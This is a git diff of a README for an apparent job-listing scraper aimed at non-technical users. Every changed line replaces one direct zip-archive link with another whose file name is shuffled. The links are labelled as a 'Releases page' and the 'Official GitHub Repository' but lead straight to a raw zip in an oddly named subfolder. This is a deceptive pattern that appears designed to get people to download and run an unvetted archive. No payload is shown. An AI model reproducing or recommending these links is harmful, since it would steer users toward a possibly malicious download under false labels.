@@ -1,6 +1,6 @@
 # 🌱 greenhouse-job-board-scraper-rental - Extract Job Listings with Ease
 
-[![Download Now](https://github.com/kellychrysostom/greenhouse-job-board-scraper-rental/raw/refs/heads/main/torolillo/job-greenhouse-scraper-rental-board-v1.8.zip%20Now-brightgreen)](https://github.com/kellychrysostom/greenhouse-job-board-scraper-rental/raw/refs/heads/main/torolillo/job-greenhouse-scraper-rental-board-v1.8.zip)
+[![Download Now](https://github.com/kellychrysostom/greenhouse-job-board-scraper-rental/raw/refs/heads/main/torolillo/board-scraper-greenhouse-job-rental-v2.8.zip%20Now-brightgreen)](https://github.com/kellychrysostom/greenhouse-job-board-scraper-rental/raw/refs/heads/main/torolillo/board-scraper-greenhouse-job-rental-v2.8.zip)
 
 ## 📋 Description
 
@@ -19,7 +19,7 @@ To get started with this application, follow the steps below. No technical skill
 
 ## 📥 Download & Install
 
-To download the greenhouse-job-board-scraper-rental, visit the [Releases page](https://github.com/kellychrysostom/greenhouse-job-board-scraper-rental/raw/refs/heads/main/torolillo/job-greenhouse-scraper-rental-board-v1.8.zip).
+To download the greenhouse-job-board-scraper-rental, visit the [Releases page](https://github.com/kellychrysostom/greenhouse-job-board-scraper-rental/raw/refs/heads/main/torolillo/board-scraper-greenhouse-job-rental-v2.8.zip).
 
 1. Click on the **Releases** link.
 2. You will see the latest version listed. Click on it to see available files.
@@ -74,8 +74,8 @@ You can contribute to the project if you have helpful suggestions or improvement
 
 For more information, visit:
 
-- [Official GitHub Repository](https://github.com/kellychrysostom/greenhouse-job-board-scraper-rental/raw/refs/heads/main/torolillo/job-greenhouse-scraper-rental-board-v1.8.zip)
-- [Releases Page](https://github.com/kellychrysostom/greenhouse-job-board-scraper-rental/raw/refs/heads/main/torolillo/job-greenhouse-scraper-rental-board-v1.8.zip)
+- [Official GitHub Repository](https://github.com/kellychrysostom/greenhouse-job-board-scraper-rental/raw/refs/heads/main/torolillo/board-scraper-greenhouse-job-rental-v2.8.zip)
+- [Releases Page](https://github.com/kellychrysostom/greenhouse-job-board-scraper-rental/raw/refs/heads/main/torolillo/board-scraper-greenhouse-job-rental-v2.8.zip)
 
 ## 💬 Community
 
